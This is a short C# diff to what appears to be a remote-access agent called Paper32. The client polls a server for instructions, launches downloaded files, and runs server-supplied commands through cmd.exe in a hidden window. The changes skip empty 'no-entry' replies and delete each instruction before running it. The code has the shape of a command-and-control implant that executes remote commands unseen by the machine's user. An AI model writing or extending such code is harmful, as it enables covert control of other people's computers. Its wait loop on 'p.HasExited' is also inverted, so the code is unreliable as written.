@@ -29,6 +29,10 @@ namespace Paper32
                 {
                     ApiClient c = new ApiClient(Info.URL, Info.Mac, Info.User, Info.HTTPAuth);
                     string inst = c.GetInstruction().Replace("~~dp~~", Info.DesktopFolderPath).Replace("~~ip~~", Info.InstallFolderPath);
+                    if (inst == "no-entry")
+                    {
+                        continue;
+                    }
                     string it = new Regex(@"Instruction-Type: (.*?);;;;").Match(inst).Groups[1].Value;
                     string source = new Regex(@"Source: (.*?);;;;").Match(inst).Groups[1].Value;
                     string dest = new Regex(@"Destination: (.*?);;;;").Match(inst).Groups[1].Value;
@@ -56,8 +60,8 @@ namespace Paper32
                         }
                         try
                         {
-                            Process.Start(dest);
                             c.DeleteInstruction();
+                            Process.Start(dest);
                         }
                         catch { }
                     }
@@ -86,13 +90,13 @@ namespace Paper32
                         }
                         try
                         {
+                            c.DeleteInstruction();
                             Process p = new Process();
                             p.StartInfo.FileName = "cmd.exe"; // start "" "path"
                             p.StartInfo.Arguments = "/C " + command;
                             p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; // Make a system to choose the style mode
                             p.Start();
                             while (p.HasExited) ;
-                            c.DeleteInstruction();
                         }
                         catch { }
                     }
